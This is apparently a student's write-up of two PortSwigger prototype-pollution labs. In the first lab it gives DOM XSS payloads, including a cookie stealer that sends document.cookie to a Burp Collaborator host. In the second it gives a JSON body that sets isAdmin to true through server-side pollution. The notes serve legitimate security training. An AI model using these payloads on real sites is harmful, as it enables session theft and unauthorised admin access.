## Approach

1. Use ***Dom Invader***, it's that or a lot of reading and making correlations
2. In general, what you can do manually is find all the sources and poison the prototype, then finding a gadget than can be used for exploit by checking all the source
3. For server-side PP, you cannot use ***DOM Invader***, a tip is to check any request that passes a JSON object to the server especially that modifies properties of a user like `isAdmin`
## Labs
### [1. Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)

> [!NOTE] 
> There's third party JS library in this lab vulnerable to PP through the hash `#` source and `setTimeout()` sink as gadget allowing DOM XSS

**Scanning for PP**

> Using ***DOM Invader*** for finding PP
![](attachments/Pasted%20image%2020260106204552.png)

**Testing PP**

> Use the test button from ***DOM Invader***
![](attachments/Pasted%20image%2020260106204724.png)

**Scanning for gadgets in the injection point**

> `setTimeout()` sink found
![](attachments/Pasted%20image%2020260106204921.png)

**Exploiting sink**

> Host in exploit server
```html
<script>
document.location="https://[LAB_URL]/#__proto__[hitCallback]=alert(document.cookie)";
</script>
```

> - Cookie stealer
> - A tip when doing XSS on URL make sure to encode URL delimiters symbols like `?` and `=`
```html
<script>
document.location="https://[LAB_URL]/#__proto__[hitCallback]=fetch(%60https://[BURP_COLLABORATOR]%3fc%3d${btoa(document.cookie)}%60)";
</script>
```

### [2. Privilege escalation via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)

> [!NOTE] 
> Privilege escalation by `isAdmin` property via **change address** functionality

**Testing SSPP**

> You will see `"foo":"bar"` added in the response
```json
"__proto__":{
"foo":"bar"
}
```

**Exploiting SSPP**

> Change the property of `isAdmin` to `true` allowing you admin access
```json
"__proto__":{
"isAdmin":true
}
```

